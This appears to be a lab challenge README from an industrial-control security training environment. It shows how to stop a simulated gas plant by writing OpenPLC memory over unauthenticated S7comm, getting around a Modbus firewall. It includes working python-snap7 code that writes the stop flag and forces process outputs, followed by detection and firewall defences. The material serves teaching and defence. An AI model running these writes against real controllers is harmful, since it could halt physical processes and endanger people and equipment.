# S7 Side Door

> **MITRE ATT&CK for ICS:** `Evasion` `Impair Process Control` | [T1692.001 - Unauthorized Message: Command Message](https://attack.mitre.org/techniques/T1692/001/) | `Impact` | [T0831 - Manipulation of Control](https://attack.mitre.org/techniques/T0831/) | [T0826 - Loss of Availability](https://attack.mitre.org/techniques/T0826/)

## Overview
In the [Modbus Firewall Rules](../defense_firewall/README.md) challenge the
defender closes port 502 on the PLC to everyone but the HMI and the I/O
service. That feels like the end of the story: Modbus is how the plant is
controlled, and Modbus is now closed.

It is not. A PLC rarely speaks only one protocol. The CybICS controller,
OpenPLC at **172.18.0.3**, also runs an **S7comm** server on **port 102**,
the protocol of Siemens S7 PLCs. You met it in the
[S7comm scanning](../scanning2/README.md) challenge as an identity record.
This time you use it for what it is made for: reading and **writing the
PLC's memory**. S7comm has no authentication either, and it reaches the very
same variables the PLC program and the Modbus clients use.

Your goal is to **stop the plant through the S7 side door**, prove it, and
put the plant back into automatic operation.

## Background

### One memory, several doors

OpenPLC keeps the program's variables in memory areas with IEC 61131-3
addresses. CybICS uses the **memory words** `%MW` for its process values and
commands. The relevant part of the PLC program
(`software/OpenPLC/cybICS.st`, also visible in OpenPLC's web interface under
*Programs*) is:

| Variable | Address | Meaning |
|----------|---------|---------|
| `gst` | `%MW100` | gas storage tank pressure |
| `hpt` | `%MW102` | high-pressure tank pressure |
| `stop` | `%MW104` | 0 = run, anything else = **stop**: compressor and system valve off |
| `manual` | `%MW106` | 0 = automatic, anything else = manual: the program stops updating the outputs |
| `systemSen` | `%MW108` | system sensor |
| `boSen` | `%MW110` | blow-out sensor |

Each server built into OpenPLC exposes these words in its own way:

| Door | Port | How `%MW104` is addressed |
|------|------|---------------------------|
| Modbus TCP | 502 | holding register **1128** (1024 + 104) |
| S7comm (Snap7) | 102 | data block **DB1002**, byte offset **208** (2 x 104), a 16-bit big-endian word |

OpenPLC's Snap7 server maps the whole `%MW` area to `DB1002`, two bytes per
word, so `%MWn` is `DB1002` bytes `2n` and `2n+1`. The located outputs
`%QX0.0`-`%QX0.3` (heartbeat, compressor, system valve, GST inlet) are the S7
process image of outputs, area `PA`, byte 0.

### Why this is a bypass

A firewall rule that drops port 502 stops Modbus, not the PLC's memory. Every
other protocol the controller offers is a second way to the same variables.
CybICS's OpenPLC configuration also enables DNP3 (20000) and EtherNet/IP
(44818); both listen on the running PLC. A
defender who closes one door and leaves the others open has not removed the
attack, only moved it.

## Where to run it

From the **attack shell** (WebShell view of the landing page, 172.18.0.100)
or the Kali attack machine. Both have `python-snap7` installed. Elsewhere:

```bash
pip install python-snap7
```

The IDS must be capturing (dashboard on port 8443, *Start* if it is
stopped), because it is the witness that the write went over S7comm.

## Task

The flag has the format `CybICS(flag)`. It is revealed by **Verify** on the
challenge page when two things hold at the same time:

- the IDS saw an **S7comm write** to OpenPLC (172.18.0.3:102) that set the
  stop flag, within the last five minutes, and no later S7comm write put 0
  back. Stopping the plant with the HMI's button or a Modbus write does not
  count, not even after an earlier S7 stop you restored: the point is the
  side door;
- the plant **is stopped** at the moment you click Verify.

Then restore the plant (step 6). The challenge expects you to leave it
running.

### Steps

1. **Find the door.** Confirm that the PLC answers on port 102:
   ```bash
   nmap -Pn -p 102,502 172.18.0.3
   ```
   *Optional, to see the bypass for real:* apply the Modbus firewall from the
   [Modbus Firewall Rules](../defense_firewall/README.md) challenge (landing
   page, admin shell). A Modbus read from the attack shell then times out,
   while everything below still works.

2. **Connect over S7comm.** Open `python3` and connect to rack 0, slot 1:
   ```python
   import snap7, struct
   plc = snap7.client.Client()
   plc.connect("172.18.0.3", 0, 1)
   print(plc.get_cpu_state())
   ```

3. **Read the plant's memory.** `%MW100`-`%MW111` are 24 bytes from
   `DB1002` offset 200. Decode them as twelve big-endian 16-bit words and
   keep every second one, because the program uses only the even words
   (`%MW101`, `%MW103`, ... sit in between):
   ```python
   raw = plc.db_read(1002, 200, 24)
   words = struct.unpack(">12H", raw)          # %MW100, %MW101, ..., %MW111
   print(words[::2])   # gst, hpt, stop, manual, systemSen, boSen
   ```
   Compare `gst` and `hpt` with the pressures on the FUXA HMI (port 1881):
   they are the same values the HMI reads over Modbus.

4. **Stop the plant.** Write 1 to the stop flag, `DB1002` offset 208:
   ```python
   plc.db_write(1002, 208, bytearray(struct.pack(">H", 1)))
   print(struct.unpack(">H", plc.db_read(1002, 208, 2)))
   ```
   On the HMI the compressor and the system valve switch off and stay off.
   On the IDS dashboard an `s7_write` alert names the address and the value
   you wrote (`DB1002.DBB208 (2 bytes) = 0001`).

5. **Verify.** While the plant is stopped, click **Verify** on the challenge
   page.

6. **Restore the plant.** Write 0 back to `stop` and, in case you changed
   it, to `manual`, then disconnect:
   ```python
   plc.db_write(1002, 208, bytearray(struct.pack(">H", 0)))   # stop   = 0
   plc.db_write(1002, 212, bytearray(struct.pack(">H", 0)))   # manual = 0
   plc.disconnect()
   ```
   If you applied the Modbus firewall in step 1, remove it again
   (`iptables -F INPUT` in the OpenPLC container) unless you want to keep it
   for the defense challenges.

`s7_sidedoor.py` in this directory does steps 2 to 4 and 6 for you
(`python3 s7_sidedoor.py`, `... stop`, `... restore`).

## Detect and Defend

### Detection
- The CybICS IDS raises `s7_enumeration` (medium) for any S7comm traffic and
  `s7_write` (high) for every S7comm **WriteVar** request, with the memory
  area, data block, byte offset and value. A write to the outputs (`PA`) is
  named as such. Nothing in the CybICS plant writes over S7comm, so every
  `s7_write` alert deserves a look.
- On the process side, `stop` changing without an operator action on the HMI
  is itself an indicator.

### Defense
- **Close every door, not one.** Filter port 102 (and 20000, 44818) on the
  PLC the same way as 502, so only the hosts that need a protocol can reach
  it:
  ```bash
  iptables -A INPUT -p tcp --dport 102 -j DROP
  ```
- **Turn off what is not used.** CybICS needs no S7comm in operation. In
  OpenPLC's web interface (port 8080) *Settings*, untick *Enable S7 Protocol*
  and the server stops listening. Every enabled protocol is attack surface.
  The [Close the Side Doors](../defense_unused_protocols/README.md) challenge
  has you do exactly that, for S7comm and the PLC's other unused protocols.
- **Allow-list by protocol and source** in a network firewall in front of the
  controller rather than per port on the host.
- On real Siemens CPUs, use the protection levels (write or read/write
  protection with a password) so that a client without the password cannot
  change memory.

## Advanced variant

With `manual` set to 1 the program stops updating its outputs, and writes to
the `PA` area then stick: `plc.write_area(Areas.PA, 0, 0, bytearray([...]))`
(`from snap7.type import Areas`) switches compressor and valves directly.
Try it, watch the IDS name the write `PA (process outputs)`, and restore
`manual` and `stop` to 0 afterwards. It does not count for this challenge.

## Security Framework References

<details>
  <summary>Click to expand</summary>

### MITRE ATT&CK for ICS

| Tactic | Technique | ID | Description |
|--------|-----------|-----|-------------|
| Evasion, Impair Process Control | Unauthorized Message: Command Message | [T1692.001](https://attack.mitre.org/techniques/T1692/001/) | An unauthenticated S7comm write command to the PLC's memory |
| Impact | Manipulation of Control | [T0831](https://attack.mitre.org/techniques/T0831/) | Setting the stop flag takes control of the compressor and valve away from the program |
| Impact | Loss of Availability | [T0826](https://attack.mitre.org/techniques/T0826/) | The stopped plant no longer delivers gas pressure |

**Why this matters:** ICS devices commonly expose several industrial protocols at once, often all enabled by default. Defences that are scoped to one protocol (a Modbus firewall rule, a Modbus-only IDS signature) leave the same process data reachable through the others.

### MITRE D3FEND - Defensive Countermeasures

| Technique | ID | Description |
|-----------|-----|-------------|
| Inbound Traffic Filtering | [D3-ITF](https://d3fend.mitre.org/technique/d3f:InboundTrafficFiltering/) | Filter every protocol port on the controller, not only 502 |
| Network Traffic Analysis | [D3-NTA](https://d3fend.mitre.org/technique/d3f:NetworkTrafficAnalysis/) | Decode S7comm and alert on write requests |
| Application Configuration Hardening | [D3-ACH](https://d3fend.mitre.org/technique/d3f:ApplicationConfigurationHardening/) | Disable unused protocol servers on the PLC |

### NIST SP 800-82r3 Reference

| Control Family | Controls | Relevance |
|----------------|----------|-----------|
| **Configuration Management (CM)** | CM-7 | Least functionality: disable protocols and services that are not required |
| **System and Communications Protection (SC)** | SC-7 | Boundary protection for every industrial protocol, not only one |
| **System and Information Integrity (SI)** | SI-4 | Monitoring that covers all protocols the controller speaks |

</details>

## Hints

<details>
  <summary>💡 Hint</summary>

OpenPLC's S7 server maps the `%MW` memory words to data block `DB1002`, two
bytes per word. The stop flag is `%MW104`. Write it while the IDS is
capturing, click Verify while the plant is stopped, then write 0 back.

</details>

## Solution

<details>
  <summary>Click to expand</summary>

From the attack shell:

```bash
cd /CybICS/training/s7_sidedoor
python3 s7_sidedoor.py           # read the memory over S7comm
python3 s7_sidedoor.py stop      # DB1002.DBW208 (%MW104, stop) = 1
```

Click **Verify** on the challenge page, then:

```bash
python3 s7_sidedoor.py restore   # stop = 0, manual = 0
```

</details>
